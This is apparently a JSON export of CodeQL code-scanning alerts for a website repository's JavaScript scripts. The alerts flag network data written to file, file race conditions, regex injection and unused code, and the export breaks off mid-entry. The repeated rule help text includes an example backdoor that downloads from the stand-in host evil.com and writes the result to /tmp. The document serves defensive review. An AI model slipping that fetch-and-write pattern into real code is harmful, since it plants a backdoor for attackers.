[
  {
    "number": 43,
    "created_at": "2025-08-27T19:08:20Z",
    "updated_at": "2025-08-27T19:08:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/43",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/43",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/http-to-file-access",
      "severity": "warning",
      "description": "Network data written to file",
      "name": "js/http-to-file-access",
      "tags": ["external/cwe/cwe-434", "external/cwe/cwe-912", "security"],
      "full_description": "Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.",
      "help": "# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Write to file system depends on Untrusted data." },
      "location": {
        "path": "scripts/verify_workflows.mjs",
        "start_line": 561,
        "end_line": 561,
        "start_column": 9,
        "end_column": 51
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/43/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 42,
    "created_at": "2025-08-27T19:08:20Z",
    "updated_at": "2025-08-27T19:08:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/42",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/42",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/http-to-file-access",
      "severity": "warning",
      "description": "Network data written to file",
      "name": "js/http-to-file-access",
      "tags": ["external/cwe/cwe-434", "external/cwe/cwe-912", "security"],
      "full_description": "Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.",
      "help": "# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Write to file system depends on Untrusted data." },
      "location": {
        "path": "scripts/verify_workflows.mjs",
        "start_line": 553,
        "end_line": 553,
        "start_column": 29,
        "end_column": 51
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/42/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 41,
    "created_at": "2025-08-27T19:08:20Z",
    "updated_at": "2025-08-27T19:08:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/41",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/41",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/http-to-file-access",
      "severity": "warning",
      "description": "Network data written to file",
      "name": "js/http-to-file-access",
      "tags": ["external/cwe/cwe-434", "external/cwe/cwe-912", "security"],
      "full_description": "Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.",
      "help": "# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Write to file system depends on Untrusted data." },
      "location": {
        "path": "scripts/verify_workflows.mjs",
        "start_line": 552,
        "end_line": 552,
        "start_column": 31,
        "end_column": 63
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/41/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 40,
    "created_at": "2025-08-27T19:08:20Z",
    "updated_at": "2025-08-27T19:08:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/40",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/40",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/http-to-file-access",
      "severity": "warning",
      "description": "Network data written to file",
      "name": "js/http-to-file-access",
      "tags": ["external/cwe/cwe-434", "external/cwe/cwe-912", "security"],
      "full_description": "Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.",
      "help": "# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Write to file system depends on Untrusted data." },
      "location": {
        "path": "scripts/codeql_drift_delta.mjs",
        "start_line": 198,
        "end_line": 198,
        "start_column": 73,
        "end_column": 79
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/40/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 39,
    "created_at": "2025-08-27T19:08:20Z",
    "updated_at": "2025-08-27T19:08:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/39",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/39",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/http-to-file-access",
      "severity": "warning",
      "description": "Network data written to file",
      "name": "js/http-to-file-access",
      "tags": ["external/cwe/cwe-434", "external/cwe/cwe-912", "security"],
      "full_description": "Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.",
      "help": "# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n",
      "security_severity_level": "medium"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "Write to file system depends on Untrusted data." },
      "location": {
        "path": "scripts/codeql_verify_append.mjs",
        "start_line": 130,
        "end_line": 130,
        "start_column": 5,
        "end_column": 36
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/39/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 38,
    "created_at": "2025-08-27T19:08:20Z",
    "updated_at": "2025-08-27T19:08:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/38",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/38",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/file-system-race",
      "severity": "warning",
      "description": "Potential file system race condition",
      "name": "js/file-system-race",
      "tags": ["external/cwe/cwe-367", "security"],
      "full_description": "Separately checking the state of a file before operating on it may allow an attacker to modify the file between the two operations.",
      "help": "# Potential file system race condition\nOften it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.\n\nHowever, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.\n\n\n## Recommendation\nUse file descriptors instead of file names whenever possible.\n\n\n## Example\nThe following example shows a case where the code checks whether a file inside the `/tmp/` folder exists, and if it doesn't, the file is written to that location.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\nif (!fs.existsSync(filePath)) {\n  fs.writeFileSync(filePath, \"Hello\", { mode: 0o600 });\n}\n\n```\nHowever, in a multi-user environment the file might be created by another user between the existence check and the write.\n\nThis can be avoided by using `fs.open` to get a file descriptor, and then use that file descriptor in the write operation.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\ntry {\n  const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);\n\n  fs.writeFileSync(fd, \"Hello\");\n} catch (e) {\n  // file existed\n}\n\n```\n\n## References\n* Wikipedia: [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).\n* The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).\n* NodeJS: [The FS module](https://nodejs.org/api/fs.html).\n* Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).\n",
      "security_severity_level": "high"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "The file may have changed since it was checked." },
      "location": {
        "path": "scripts/verify_workflows.mjs",
        "start_line": 457,
        "end_line": 460,
        "start_column": 21,
        "end_column": 16
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/38/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 37,
    "created_at": "2025-08-27T19:08:20Z",
    "updated_at": "2025-08-27T19:08:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/37",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/37",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/file-system-race",
      "severity": "warning",
      "description": "Potential file system race condition",
      "name": "js/file-system-race",
      "tags": ["external/cwe/cwe-367", "security"],
      "full_description": "Separately checking the state of a file before operating on it may allow an attacker to modify the file between the two operations.",
      "help": "# Potential file system race condition\nOften it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.\n\nHowever, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.\n\n\n## Recommendation\nUse file descriptors instead of file names whenever possible.\n\n\n## Example\nThe following example shows a case where the code checks whether a file inside the `/tmp/` folder exists, and if it doesn't, the file is written to that location.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\nif (!fs.existsSync(filePath)) {\n  fs.writeFileSync(filePath, \"Hello\", { mode: 0o600 });\n}\n\n```\nHowever, in a multi-user environment the file might be created by another user between the existence check and the write.\n\nThis can be avoided by using `fs.open` to get a file descriptor, and then use that file descriptor in the write operation.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\ntry {\n  const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);\n\n  fs.writeFileSync(fd, \"Hello\");\n} catch (e) {\n  // file existed\n}\n\n```\n\n## References\n* Wikipedia: [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).\n* The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).\n* NodeJS: [The FS module](https://nodejs.org/api/fs.html).\n* Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).\n",
      "security_severity_level": "high"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "The file may have changed since it was checked." },
      "location": {
        "path": "scripts/verify_workflows.mjs",
        "start_line": 445,
        "end_line": 445,
        "start_column": 33,
        "end_column": 63
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/37/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 36,
    "created_at": "2025-08-27T19:08:20Z",
    "updated_at": "2025-08-27T19:08:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/36",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/36",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/file-system-race",
      "severity": "warning",
      "description": "Potential file system race condition",
      "name": "js/file-system-race",
      "tags": ["external/cwe/cwe-367", "security"],
      "full_description": "Separately checking the state of a file before operating on it may allow an attacker to modify the file between the two operations.",
      "help": "# Potential file system race condition\nOften it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.\n\nHowever, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.\n\n\n## Recommendation\nUse file descriptors instead of file names whenever possible.\n\n\n## Example\nThe following example shows a case where the code checks whether a file inside the `/tmp/` folder exists, and if it doesn't, the file is written to that location.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\nif (!fs.existsSync(filePath)) {\n  fs.writeFileSync(filePath, \"Hello\", { mode: 0o600 });\n}\n\n```\nHowever, in a multi-user environment the file might be created by another user between the existence check and the write.\n\nThis can be avoided by using `fs.open` to get a file descriptor, and then use that file descriptor in the write operation.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\ntry {\n  const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);\n\n  fs.writeFileSync(fd, \"Hello\");\n} catch (e) {\n  // file existed\n}\n\n```\n\n## References\n* Wikipedia: [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).\n* The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).\n* NodeJS: [The FS module](https://nodejs.org/api/fs.html).\n* Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).\n",
      "security_severity_level": "high"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "The file may have changed since it was checked." },
      "location": {
        "path": "scripts/verify_workflows.mjs",
        "start_line": 359,
        "end_line": 359,
        "start_column": 25,
        "end_column": 53
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/36/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 35,
    "created_at": "2025-08-27T19:08:20Z",
    "updated_at": "2025-08-27T19:08:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/35",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/35",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/regex-injection",
      "severity": "error",
      "description": "Regular expression injection",
      "name": "js/regex-injection",
      "tags": ["external/cwe/cwe-400", "external/cwe/cwe-730", "security"],
      "full_description": "User input should not be used in regular expressions without first being escaped, otherwise a malicious user may be able to inject an expression that could require exponential time on certain inputs.",
      "help": "# Regular expression injection\nConstructing a regular expression with unsanitized user input is dangerous as a malicious user may be able to modify the meaning of the expression. In particular, such a user may be able to provide a regular expression fragment that takes exponential time in the worst case, and use that to perform a Denial of Service attack.\n\n\n## Recommendation\nBefore embedding user input into a regular expression, use a sanitization function such as lodash's `_.escapeRegExp` to escape meta-characters that have special meaning.\n\n\n## Example\nThe following example shows a HTTP request parameter that is used to construct a regular expression without sanitizing it first:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/findKey', function(req, res) {\n  var key = req.param(\"key\"), input = req.param(\"input\");\n\n  // BAD: Unsanitized user input is used to construct a regular expression\n  var re = new RegExp(\"\\\\b\" + key + \"=(.*)\\n\");\n});\n\n```\nInstead, the request parameter should be sanitized first, for example using the function `_.escapeRegExp` from the lodash package. This ensures that the user cannot insert characters which have a special meaning in regular expressions.\n\n\n```javascript\nvar express = require('express');\nvar _ = require('lodash');\nvar app = express();\n\napp.get('/findKey', function(req, res) {\n  var key = req.param(\"key\"), input = req.param(\"input\");\n\n  // GOOD: User input is sanitized before constructing the regex\n  var safeKey = _.escapeRegExp(key);\n  var re = new RegExp(\"\\\\b\" + safeKey + \"=(.*)\\n\");\n});\n\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* npm: [lodash](https://www.npmjs.com/package/lodash).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n",
      "security_severity_level": "high"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": { "text": "This regular expression is constructed from a command-line argument." },
      "location": {
        "path": "scripts/verify_workflows.mjs",
        "start_line": 507,
        "end_line": 507,
        "start_column": 36,
        "end_column": 56
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/35/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 34,
    "created_at": "2025-08-27T04:48:20Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/34",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/34",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/useless-assignment-to-local",
      "severity": "warning",
      "description": "Useless assignment to local variable",
      "name": "js/useless-assignment-to-local",
      "tags": ["external/cwe/cwe-563", "maintainability", "quality", "useless-code"],
      "full_description": "An assignment to a local variable that is not used later on, or whose value is always overwritten, has no effect.",
      "help": "# Useless assignment to local variable\nA value is assigned to a variable or property, but either that location is never read later on, or its value is always overwritten before being read. This means that the original assignment has no effect, and could indicate a logic error or incomplete code.\n\n\n## Recommendation\nEnsure that you check the control and data flow in the method carefully. If a value is really not needed, consider omitting the assignment. Be careful, though: if the right-hand side has a side-effect (like performing a method call), it is important to keep this to preserve the overall behavior.\n\n\n## Example\nIn the following example, the return value of the call to `send` on line 2 is assigned to the local variable `result`, but then never used.\n\n\n```javascript\nfunction f(x) {\n\tvar result = send(x);\n\twaitForResponse();\n\treturn getResponse();\n}\n```\nAssuming that `send` returns a status code indicating whether the operation succeeded or not, the value of `result` should be checked, perhaps like this:\n\n\n```javascript\nfunction f(x) {\n\tvar result = send(x);\n\t// check for error\n\tif (result === -1)\n\t\tthrow new Error(\"send failed\");\n\twaitForResponse();\n\treturn getResponse();\n}\n```\n\n## References\n* Wikipedia: [Dead store](http://en.wikipedia.org/wiki/Dead_store).\n* Common Weakness Enumeration: [CWE-563](https://cwe.mitre.org/data/definitions/563.html).\n"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript-typescript\"}",
      "category": "/language:javascript-typescript",
      "state": "open",
      "commit_sha": "45662b7df97145b24172844216d048793e1001a7",
      "message": {
        "text": "The initial value of updated is unused, since it is always overwritten."
      },
      "location": {
        "path": "scripts/codeql_verify_append.mjs",
        "start_line": 139,
        "end_line": 139,
        "start_column": 7,
        "end_column": 22
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/34/instances",
    "dismissal_approved_by": null
  },
  {
    "number": 33,
    "created_at": "2025-08-27T04:48:20Z",
    "updated_at": "2025-08-27T04:48:20Z",
    "url": "https://api.github.com/repos/bbasketballer75/theporadas_site/code-scanning/alerts/33",
    "html_url": "https://github.com/bbasketballer75/theporadas_site/security/code-scanning/33",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/unused-local-variable",
      "severity": "note",
      "description": "Unused variable, import, function or class",
      "name": "js/unused-local-variable",
      "tags": ["maintainability", "quality", "useless-code"],
      "full_description": "Unused variables, imports, functions or classes may be a symptom of a bug and should be examined carefully.",
      "help": "# Unused variable, import, function or class\nUnused local variables make code hard to read and understand. Any computation used to initialize an unused variable is wasted, which may lead to performance problems.\n\nSimilarly, unused imports and unused functions or classes can be confusing. They may even be a symptom of a bug caused, for example, by an incomplete refactoring.\n\n\n## Recommendation\nRemove the unused program element.\n\n\n## Example\nIn this code, the function `f` initializes a local variable `x` with a call to the function `expensiveComputation`, but later on this variable is never read. Removing `x` would improve code quality and performance.\n\n\n```javascript\nfunction f() {\n\tvar x = expensiveComputation();\n\treturn 23;\n}\n```\nA slightly subtle case is shown below, where a function expression named `f` is assigned to a variable `f`:\n\n\n```javascript\nvar f = function f() {\n  return \"Hi!\";\n};\nf();\n```\nNote that this example involves two distinct variables, both named `f`: the global variable to which the function is assigned, and the variable implicitly declared by the function expression. The call to `f()` refers to the former variable, whereas the latter is unused. Hence the example can be rewritten as follows, eliminating the useless variable:\n\n\n```javascript\nvar f = function () {\n  return \"Hi!\";\n};\nf();\n```\nA similar situation can occur with ECMAScript 2015 module exports, as shown in the following example:\n\n\n```javascript\nexport default function f() {\n  return \"Hi!\";\n};\n```\nAgain, the named function expression implicitly declares a variable `f`, but because the export statement is a default export, this variable is unused and can be eliminated:\n\n\n```javascript\nexport default function () {\n  return \"Hi!\";\n};\n```\n\n## References\n* Coding Horror: [Code Smells](http://blog.codinghorror.com/code-smells/).\n* Mozilla Developer Network: [Named function expressions](https://developer.mozilla.org/en/docs/web/JavaScript/Reference/Operators/function#Named_function_expression).\n* Mozilla Developer Network: [Using the default export](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/export#Using_the_default_export).\n"
    },
    "tool": { "name": "CodeQL", "guid": null, "version": "2.22.4" },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
